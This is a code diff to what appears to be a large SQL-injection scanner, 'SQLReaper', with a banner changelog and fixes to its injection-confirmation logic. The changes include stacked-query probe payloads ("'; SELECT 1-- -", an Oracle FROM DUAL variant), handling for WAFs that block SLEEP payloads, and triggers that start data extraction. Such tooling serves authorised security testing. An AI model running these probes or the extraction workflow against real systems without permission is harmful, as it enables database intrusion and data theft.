@@ -1,9 +1,65 @@
 #!/usr/bin/env python3
 r"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
-║  SQLReaper v214 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 8, 2026)          ║
-║  v213 FINAL base + 5 bugs fixed (cross-examined against 3× live production log). ║
-║  All found by fresh direct line-by-line code reading — zero changelog reliance.  ║
+║  SQLReaper v214 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 12, 2026)         ║
+║  v214 base + 7 additional bugs fixed (deep audit of PCV, S-technique, race       ║
+║  conditions, and benign-oracle correctness). All found by fresh direct            ║
+║  line-by-line code reading — zero changelog reliance.                             ║
+║                                                                                    ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║  FRESH EXAMINATION AUDIT (v214 → v214.1) — 7 BUGS FIXED                         ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                    ║
+║  [✓] BUG-V214-1: _post_confirm_verify_locked boolean FP-preconfirmed + Check A  ║
+║      path did not set det._pcv_verified = True — secondary PCV gate re-evaluated║
+║      already-confirmed detections, creating a race where _INJECTION_CONFIRMED[0] ║
+║      was False at the moment the secondary PCV gate read it; HIGH; boolean techs;║
+║      all DBMSes; all surfaces.                                                    ║
+║      Fix: added det._pcv_verified = True before _INJECTION_CONFIRMED[0] = True  ║
+║      in the `if _a_pass and _fp_preconfirmed and _is_boolean_tech:` branch.      ║
+║                                                                                    ║
+║  [✓] BUG-V214-2: _post_confirm_verify_locked FP-preconfirmed >= 1.0 + Wasserstein║
+║      >= 0.90 path did not set det._pcv_verified = True — same race as BUG-1     ║
+║      for the no-Check-A-canary confirmation path; HIGH; boolean techs; CDN       ║
+║      high-jitter surfaces.                                                        ║
+║      Fix: added det._pcv_verified = True before _INJECTION_CONFIRMED[0] = True  ║
+║      in the `if _wassr_early_dist >= 0.90:` branch.                              ║
+║                                                                                    ║
+║  [✓] BUG-V214-3: _spi_is_path_manip only checked for HTTP 404 — path corruption ║
+║      returning 302 / 410 / 500 was misclassified as real injection; _spi_benign_ ║
+║      ok accepted any non-None non-WAF non-404 status (including 302/500) as      ║
+║      "benign ok"; MEDIUM; S technique; path-injection surfaces; all DBMSes.      ║
+║      Fix: _spi_is_path_manip now catches ALL non-2xx non-WAF statuses; _spi_     ║
+║      benign_ok now requires HTTP 2xx (200-299) only.                              ║
+║                                                                                    ║
+║  [✓] BUG-V214-4: S→T-CANARY benign probe "'; SELECT 1-- -" is a syntax error   ║
+║      on Oracle (ORA-00923: FROM keyword not found where expected) — Oracle path- ║
+║      injection surfaces always returned 500/ORA error, forcing _spi_all_stacked_ ║
+║      blocked=True and triggering the mp_confirmed shortcut on actual FPs; HIGH;  ║
+║      S technique; path-injection surfaces; Oracle only.                           ║
+║      Fix: Oracle → "'; SELECT 1 FROM DUAL-- -"; all other DBMSes unchanged.     ║
+║                                                                                    ║
+║  [✓] BUG-V214-5: S technique on path-injection surface with timing-keyword       ║
+║      payload (SLEEP/PG_SLEEP/WAITFOR/etc.) had no WAF-blocked-SLEEP recovery —  ║
+║      when WAF blocks SLEEP on a path-injection surface, timing probes are        ║
+║      identically fast and Step 2 returns False, discarding a real injection;     ║
+║      HIGH; S technique; path-injection surfaces; all DBMSes; WAF-protected.      ║
+║      Fix: when Step 2 timing fails and _s_is_path_inj=True, fall through to     ║
+║      benign oracle (same logic as S→T-CANARY) to disambiguate via status code.  ║
+║                                                                                    ║
+║  [✓] BUG-V214-6: Secondary PCV rejection race — concurrent secondary PCV could  ║
+║      cancel extraction while S→T-CANARY was suspended at an await with           ║
+║      _INJECTION_CONFIRMED[0] still False (set only AFTER confirming); the guard  ║
+║      `if _INJECTION_CONFIRMED[0]:` is insufficient when in-flight PCV coroutines ║
+║      haven't confirmed yet; HIGH; S technique; all surfaces; async concurrency.  ║
+║      Fix: changed guard to `if _INJECTION_CONFIRMED[0] or _PCV_IN_PROGRESS[0]   ║
+║      > 0:` at both secondary PCV rejection sites (v13 cascade + V25 cascade).    ║
+║                                                                                    ║
+║  [✓] BUG-V214-7: MicroTimingOracle (Mann-Whitney U supplemental timing check)   ║
+║      was not called for S technique — tech in ("T","BT","TH","HQ") excluded S;  ║
+║      S timing detections with marginal Check B evidence could not fall back to   ║
+║      MicroTimingOracle when _b_pass=False; LOW; S technique; all DBMSes.         ║
+║      Fix: added "S" to the MicroTimingOracle tech set.                           ║
 ║                                                                                    ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
 ║  FRESH EXAMINATION AUDIT (v213 FINAL → v214) — 5 BUGS FIXED                     ║
@@ -101327,7 +101383,16 @@ class ScannerV11(ScannerV10):
                             # when True — this caused _v14_cascade's secondary PCV gate to
                             # see False and cancel an already-running extraction task, causing
                             # the "[PCV-FP] Cancelling in-flight extraction task" false abort.
-                            if _INJECTION_CONFIRMED[0]:
+                            #
+                            # BUG-V214-PCV-RACE-FIX: Also guard on _PCV_IN_PROGRESS[0] > 0.
+                            # When S→T-CANARY is suspended at an await with _INJECTION_CONFIRMED[0]
+                            # still False (it sets True only after awaiting and confirming),
+                            # a concurrent secondary PCV can race here, see False, and cancel
+                            # extraction while the in-flight S→T-CANARY is about to confirm.
+                            # _PCV_IN_PROGRESS[0] > 0 means at least one inline PCV coroutine
+                            # is still in-flight — treat the rejection as "discard candidate only"
+                            # (same as _INJECTION_CONFIRMED[0]=True path) to avoid premature cancel.
+                            if _INJECTION_CONFIRMED[0] or _PCV_IN_PROGRESS[0] > 0:
                                 print(f"[!] Secondary PCV rejected [{_pcv_tech}] "
                                       "candidate after full A-E evaluation — discarding "
                                       "this candidate only; original injection already "
@@ -110806,20 +110871,44 @@ class TechniqueCascadeEngine:
                         #   bypasses this ambiguity: it has ';' but no SLEEP/WAITFOR/etc.,
                         #   so SLEEP-specific WAF rules don't fire, and only path routing
                         #   determines the response (200 = SQL processed, 404 = path corrupted).
-                        _spi_benign_pay = "'; SELECT 1-- -"
+                        # BUG-V214-ORACLE-BENIGN-PROBE-FIX: Oracle requires FROM DUAL for
+                        # bare SELECT; "'; SELECT 1-- -" is a syntax error on Oracle but valid
+                        # on MySQL/MSSQL/PostgreSQL/SQLite/MariaDB.  Use DBMS-specific probe:
+                        # Oracle → "'; SELECT 1 FROM DUAL-- -", all others → "'; SELECT 1-- -".
+                        # Without this fix, Oracle path-injection surfaces always return an Oracle
+                        # syntax error (ORA-00923), which maps to a WAF/5xx status code, causing
+                        # _spi_all_stacked_blocked=True and triggering the mp_confirmed shortcut
+                        # even on actual path-manipulation FPs.
+                        if _dbms_spi in ("ORACLE",):
+                            _spi_benign_pay = "'; SELECT 1 FROM DUAL-- -"
+                        else:
+                            _spi_benign_pay = "'; SELECT 1-- -"
                         _spi_benign_resp = await self._safe_confirm(method, url, data, data_fmt,
                             param, original + _spi_benign_pay, self.tamper_chain)
                         _spi_benign_st = getattr(_spi_benign_resp, 'status_code', None) if _spi_benign_resp else None
                         _spi_true_st   = getattr(_spi_true_resp,  'status_code', None) if _spi_true_resp  else None
                         _spi_false_st  = getattr(_spi_false_resp, 'status_code', None) if _spi_false_resp else None
                         _spi_waf_status_codes = (400, 403, 406, 429, 430, 444, 451)
-                        # Case 1: Path manipulation — benign probe (no SLEEP, but has ';') returns 404
-                        _spi_is_path_manip = (_spi_benign_st == 404)
-                        # Case 2: Real injection + WAF blocks SLEEP — benign probe bypasses WAF → 200
+                        # Case 1: Path manipulation — benign probe (no SLEEP, but has ';') returns a
+                        # non-2xx, non-WAF response.  BUG-V214-SPI-PATH-MANIP-FIX: The original check
+                        # was (_spi_benign_st == 404), which only caught 404.  Path corruption can also
+                        # produce 302 (redirect to error page), 410 (Gone), 500 (server error on bad
+                        # path), or other non-2xx codes.  All non-2xx, non-WAF responses indicate the
+                        # ';' corrupted the path (the server routed to a different/invalid resource),
+                        # and should be classified as path manipulation FP — NOT as real injection.
+                        _spi_is_path_manip = (
+                            _spi_benign_st is not None and
+                            not (200 <= _spi_benign_st < 300) and
+                            _spi_benign_st not in _spi_waf_status_codes
+                        )
+                        # Case 2: Real injection + WAF blocks SLEEP — benign probe bypasses WAF → 2xx.
+                        # BUG-V214-SPI-BENIGN-OK-FIX: The original check passed any status that was not
+                        # None, not WAF, and not 404 — including 302, 410, 500, which are path-corruption
+                        # responses misclassified as "benign ok" (real injection).  Only a 2xx response
+                        # confirms the server processed the stacked SQL without path corruption.
                         _spi_benign_ok = (
                             _spi_benign_st is not None and
-                            _spi_benign_st not in _spi_waf_status_codes and
-                            _spi_benign_st != 404
+                            200 <= _spi_benign_st < 300
                         )
                         # Case 3: WAF blocks all stacked queries — benign also blocked
                         _spi_all_stacked_blocked = (_spi_benign_st in _spi_waf_status_codes)
@@ -111242,12 +111331,127 @@ class TechniqueCascadeEngine:
                         print(f"[!] PCV FAILED [{tech}] {dbms}  anti-jitter 2nd probe failed "
                               f"(d2={_d2_ms:.0f}ms gap={_gap2_vs_half:.0f}ms thresh={_thresh:.0f}ms) "
                               "— server jitter, NOT confirmed", flush=True)
-                        return False
+                        if _s_is_path_inj:
+                            # BUG-V214-SPI-TIMING-FALLBACK-FIX: Timing anti-jitter failed on a
+                            # path-injection surface.  WAF may block SLEEP before path routing,
+                            # making half/double probes identically fast.  Fall through to benign
+                            # oracle below to distinguish path-manipulation FP from real injection.
+                            _spit_need_oracle = True
+                        else:
+                            return False
                 else:
                     print(f"[!] PCV FAILED [{tech}] {dbms}  timing NOT proportional "
                           f"(half={_h_ms:.0f}ms double={_d_ms:.0f}ms thresh={_thresh:.0f}ms) "
                           "— rejecting", flush=True)
-                    return False
+                    if _s_is_path_inj:
+                        # BUG-V214-SPI-TIMING-FALLBACK-FIX: Timing not proportional on a
+                        # path-injection surface.  WAF may block SLEEP before path routing,
+                        # making half/double probes return identical fast responses.  Fall
+                        # through to benign oracle below to distinguish the cases.
+                        _spit_need_oracle = True
+                    else:
+                        return False
+                # BUG-V214-SPI-TIMING-FALLBACK-FIX: Benign oracle for path-injection + timing
+                # payload where Step 2 proportional timing failed.  When WAF blocks SLEEP on a
+                # path-injection surface, both half and double probes are fast/equal — timing
+                # rejects, but the injection may still be real.  Send a benign stacked probe
+                # (no SLEEP keyword) to distinguish path manipulation FP from real injection
+                # where WAF only blocks SLEEP-carrying payloads.
+                if _s_is_path_inj and locals().get('_spit_need_oracle'):
+                    _spit_waf_codes = (400, 403, 406, 429, 430, 444, 451)
+                    _dbms_spit2 = (dbms or '').upper()
+                    if _dbms_spit2 in ("ORACLE",):
+                        _spit_benign_pay = "'; SELECT 1 FROM DUAL-- -"
+                    else:
+                        _spit_benign_pay = "'; SELECT 1-- -"
+                    _spit_benign_resp = await self._safe_confirm(method, url, data, data_fmt,
+                        param, original + _spit_benign_pay, self.tamper_chain)
+                    _spit_benign_st = (getattr(_spit_benign_resp, 'status_code', None)
+                                       if _spit_benign_resp else None)
+                    _spit_is_path_manip = (
+                        _spit_benign_st is not None and
+                        not (200 <= _spit_benign_st < 300) and
+                        _spit_benign_st not in _spit_waf_codes
+                    )
+                    _spit_benign_ok2 = (
+                        _spit_benign_st is not None and
+                        200 <= _spit_benign_st < 300
+                    )
+                    _spit_all_blocked = (_spit_benign_st in _spit_waf_codes)
+                    if _spit_is_path_manip:
+                        print(f"[!] PCV FAILED [S→T-CANARY+TIMING] {dbms}"
+                              f"  benign_status={_spit_benign_st}"
+                              f"  (non-2xx non-WAF = ';' corrupts URL path → path-manipulation FP)",
+                              flush=True)
+                        return False
+                    elif _spit_all_blocked:
+                        if _s_already_mp_confirmed:
+                            print(f"[+] PCV CONFIRMED [S→T-CANARY+TIMING] {dbms}"
+                                  f"  WAF blocks all stacked (benign_status={_spit_benign_st})"
+                                  f" + 5/5 multi-probe pre-confirmed → accepting", flush=True)
+                            if det is not None:
+                                try:
+                                    det._pcv_verified = True
+                                    if hasattr(det, 'detection') and det.detection is not None:
+                                        det.detection._pcv_verified = True
+                                except Exception:
+                                    pass
+                            _INJECTION_CONFIRMED[0] = True
+                            _SCAN_STOPPED[0] = True
+                            _cev_spit4 = (getattr(self, '_confirmed_event', None) or
+                                          getattr(getattr(self, 'config', None), '_confirmed_event', None))
+                            if _cev_spit4 and not _cev_spit4.is_set():
+                                try: _cev_spit4._bg_result = det
+                                except Exception: pass
+                                _cev_spit4.set()
+                            _gate_spit4 = getattr(self, '_gate', None)
+                            if _gate_spit4 and not getattr(_gate_spit4, 'killed', True):
+                                try: _gate_spit4.kill()
+                                except Exception: pass
+                            return True
+                        else:
+                            print(f"[!] PCV FAILED [S→T-CANARY+TIMING] {dbms}"
+                                  f"  WAF blocks all stacked queries (benign_status={_spit_benign_st})"
+                                  f"  and multi-probe not confirmed — cannot distinguish", flush=True)
+                            return False
+                    elif _spit_benign_ok2:
+                        if _s_already_mp_confirmed:
+                            print(f"[+] PCV CONFIRMED [S→T-CANARY+TIMING] {dbms}"
+                                  f"  benign_status={_spit_benign_st} (2xx = stacked SQL processed)"
+                                  f" + 5/5 multi-probe pre-confirmed"
+                                  f" → WAF blocks SLEEP only; real injection confirmed", flush=True)
+                            if det is not None:
+                                try:
+                                    det._pcv_verified = True
+                                    if hasattr(det, 'detection') and det.detection is not None:
+                                        det.detection._pcv_verified = True
+                                except Exception:
+                                    pass
+                            _INJECTION_CONFIRMED[0] = True
+                            _SCAN_STOPPED[0] = True
+                            _cev_spit5 = (getattr(self, '_confirmed_event', None) or
+                                          getattr(getattr(self, 'config', None), '_confirmed_event', None))
+                            if _cev_spit5 and not _cev_spit5.is_set():
+                                try: _cev_spit5._bg_result = det
+                                except Exception: pass
+                                _cev_spit5.set()
+                            _gate_spit5 = getattr(self, '_gate', None)
+                            if _gate_spit5 and not getattr(_gate_spit5, 'killed', True):
+                                try: _gate_spit5.kill()
+                                except Exception: pass
+                            return True
+                        else:
+                            print(f"[!] PCV FAILED [S→T-CANARY+TIMING] {dbms}"
+                                  f"  benign_status={_spit_benign_st}"
+                                  f"  (2xx = stacked SQL processed; WAF blocks SLEEP only)"
+                                  f"  but multi-probe not confirmed"
+                                  f"  — cannot confirm without 5/5 probe evidence", flush=True)
+                            return False
+                    else:
+                        print(f"[!] PCV FAILED [S→T-CANARY+TIMING] {dbms}"
+                              f"  benign_status={_spit_benign_st} (unclassified) — rejecting",
+                              flush=True)
+                        return False
             except Exception as _s_pcv_err:
                 print(f"[!] PCV ERROR [{tech}] {dbms}: {_s_pcv_err}  rejecting (safe default)",
                       flush=True)
@@ -117827,7 +118031,7 @@ class TechniqueCascadeEngine:
         # MicroTimingOracle was fully implemented (Mann-Whitney U test on 30 micro-delay
         # samples) but NEVER called in the main detection path — dead code.
         # Wire it here as a fallback when _b_pass is False (all canary pairs failed).
-        if not _b_pass and tech in ("T", "BT", "TH", "HQ") and dbms and not _cdn_all_detected:
+        if not _b_pass and tech in ("T", "BT", "TH", "HQ", "S") and dbms and not _cdn_all_detected:
             try:
                 _micro_cond = "1=1"  # universal true condition
                 # BUG-V72-MICROTIMING-SENDFN FIX: The old lambda `lambda _p: _pcv_send(_p)`
@@ -118336,6 +118540,18 @@ class TechniqueCascadeEngine:
             _fpg_conf = getattr(det, '_fp_guards_confidence', 0.70) if det else 0.70
             print(f"[*]   [PCV] Result: CONFIRMED  boolean FP guards pre-passed ({_fpg_conf:.3f}) "
                   "+ Check A body canary — 3-layer statistical confirmation accepted", flush=True)
+            # BUG-V214-PCV-VERIFIED-BOOL-FIX: Mark inline PCV as verified so the secondary PCV
+            # Final Gate (_already_pcv check) sees _pcv_verified=True and skips re-evaluation.
+            # Without this, the secondary PCV gate unconditionally re-runs PCV on already-confirmed
+            # detections, and when PCV re-runs asynchronously _INJECTION_CONFIRMED[0] may still be
+            # False (set below, AFTER this guard), causing the secondary PCV to cancel extraction.
+            if det is not None:
+                try:
+                    det._pcv_verified = True
+                    if hasattr(det, 'detection') and det.detection is not None:
+                        det.detection._pcv_verified = True
+                except Exception:
+                    pass
             _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
             _SCAN_STOPPED[0] = True
             return True, 1, _details
@@ -118371,6 +118587,18 @@ class TechniqueCascadeEngine:
                           "— Check A canary skipped (3-layer statistical + Wasserstein dual-signal "
                           "at high confidence; RC-FINDING5-FP guard passed)",
                           flush=True)
+                    # BUG-V214-PCV-VERIFIED-WASSR-FIX: Mark inline PCV as verified so the secondary
+                    # PCV Final Gate sees _pcv_verified=True and skips re-evaluation.  Without this,
+                    # the secondary PCV gate re-runs for already-confirmed detections, and the race
+                    # between _INJECTION_CONFIRMED[0] (set below) and the secondary PCV coroutine
+                    # resuming causes the "cancelling extraction" false abort.
+                    if det is not None:
+                        try:
+                            det._pcv_verified = True
+                            if hasattr(det, 'detection') and det.detection is not None:
+                                det.detection._pcv_verified = True
+                        except Exception:
+                            pass
                     _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
                     _SCAN_STOPPED[0] = True
                     return True, 1, _details
@@ -136085,7 +136313,16 @@ class ScannerV14(ScannerV13):
                             # When _INJECTION_CONFIRMED[0] is False, secondary PCV rejection
                             # IS authoritative: no prior inline PCV confirmation exists,
                             # this really is a false positive.  Cancel extraction and reset.
-                            if _INJECTION_CONFIRMED[0]:
+                            #
+                            # BUG-V214-PCV-RACE-FIX: Also guard on _PCV_IN_PROGRESS[0] > 0.
+                            # When S→T-CANARY is suspended at an await with _INJECTION_CONFIRMED[0]
+                            # still False (it sets True only after awaiting and confirming),
+                            # a concurrent secondary PCV can race here, see False, and cancel
+                            # extraction while the in-flight S→T-CANARY is about to confirm.
+                            # _PCV_IN_PROGRESS[0] > 0 means at least one inline PCV coroutine
+                            # is still in-flight — treat the rejection as "discard candidate only"
+                            # (same as _INJECTION_CONFIRMED[0]=True path) to avoid premature cancel.
+                            if _INJECTION_CONFIRMED[0] or _PCV_IN_PROGRESS[0] > 0:
                                 print(f"[!] Secondary PCV rejected [{_pcv_tech}] "
                                       "candidate after full A-E evaluation — discarding "
                                       "this candidate only; original injection already "
